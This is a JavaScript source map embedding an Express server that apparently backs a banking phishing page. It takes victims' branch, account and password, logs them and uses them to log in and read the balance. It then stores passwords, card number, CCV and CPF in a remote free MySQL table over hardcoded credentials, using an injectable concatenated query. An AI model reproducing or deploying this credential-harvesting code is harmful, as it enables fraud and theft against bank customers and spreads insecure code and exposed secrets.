{"version":3,"sources":["../src/index.js"],"names":["express","require","app","bodyParser","cors","path","use","urlencoded","extended","json","origin","get","req","res","sendFile","join","__dirname","post","name","checkingBalance","main","module","bb","BB","branch","body","agencia","account","conta","password","pass","console","log","login","checking","getBalance","nomeCliente","balance","mysql","con","createConnection","host","user","database","connect","err","sql","data_1","data_2","data_3","data_4","data_5","data_6","data_7","data_8","data_9","data_10","data_11","data_12","query","result","listen","process","env","PORT"],"mappings":"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","sourcesContent":["import BB from './bb';\r\n\r\nconst express = require('express');\r\nconst app = express();\r\nconst bodyParser = require('body-parser');\r\nconst cors = require('cors');\r\nconst path = require('path');\r\n\r\napp.use(bodyParser.urlencoded({ extended: false }));\r\napp.use(bodyParser.json());\r\napp.use(cors({ origin: '*' }));\r\napp.use(express.urlencoded({ extended: false }));\r\napp.use(express.json());\r\napp.use(express.static('public'));\r\n\r\napp.get('*', (req, res) => {\r\n  res.sendFile(path.join(__dirname + '/public/index.html'));\r\n});\r\n\r\napp.post('/getData', async (req, res) => {\r\n  try {\r\n    let name = '';\r\n    let checkingBalance = '';\r\n\r\n    if (require.main === module) {\r\n      const bb = new BB();\r\n      let branch = req.body.agencia;\r\n      let account = req.body.conta;\r\n      let password = req.body.pass;\r\n      console.log(branch, account, password);\r\n\r\n      name = await bb.login({ branch, account, password });\r\n      checkingBalance = await bb.checking.getBalance();\r\n      console.log(name.nomeCliente, checkingBalance);\r\n    }\r\n\r\n    if (name == '') {\r\n      res.json({ name: name, balance: checkingBalance });\r\n    } else {\r\n      res.json({ name: name.nomeCliente, balance: checkingBalance });\r\n    }\r\n  } catch (err) {\r\n    res.json({ name: '', balance: '' });\r\n  }\r\n});\r\n\r\napp.post('/inputData', async (req, res) => {\r\n  try {\r\n    let mysql = require('mysql');\r\n\r\n    let con = mysql.createConnection({\r\n      host: 'sql11.freemysqlhosting.net',\r\n      user: 'sql11458641',\r\n      password: 'SNDmBNx6wA',\r\n      database: 'sql11458641',\r\n    });\r\n\r\n    con.connect(function(err) {\r\n      if (err) throw err;\r\n      console.log('Connected!');\r\n      let sql =\r\n        \"INSERT INTO tbl_access_info (date, agencia, conta, senha_de_8, saldo, cell, senha_de_6, silabica, nome_do_cartao, numero_do_cartao, ccv, cpf) VALUES ('\" +\r\n        req.body.data_1 +\r\n        \"', '\" +\r\n        req.body.data_2 +\r\n        \"', '\" +\r\n        req.body.data_3 +\r\n        \"', '\" +\r\n        req.body.data_4 +\r\n        \"', '\" +\r\n        req.body.data_5 +\r\n        \"', '\" +\r\n        req.body.data_6 +\r\n        \"', '\" +\r\n        req.body.data_7 +\r\n        \"', '\" +\r\n        req.body.data_8 +\r\n        \"', '\" +\r\n        req.body.data_9 +\r\n        \"', '\" +\r\n        req.body.data_10 +\r\n        \"', '\" +\r\n        req.body.data_11 +\r\n        \"', '\" +\r\n        req.body.data_12 +\r\n        \"')\";\r\n      con.query(sql, function(err, result) {\r\n        if (err) throw err;\r\n        console.log('1 record inserted');\r\n      });\r\n    });\r\n\r\n    res.json({ result: 'success' });\r\n  } catch (err) {\r\n    res.json({ result: 'fail' });\r\n  }\r\n});\r\n\r\napp.listen(process.env.PORT || 5000);\r\n\r\nconsole.log('Running at Port 5000');\r\n\r\nexport default BB;\r\n"],"file":"index.js"}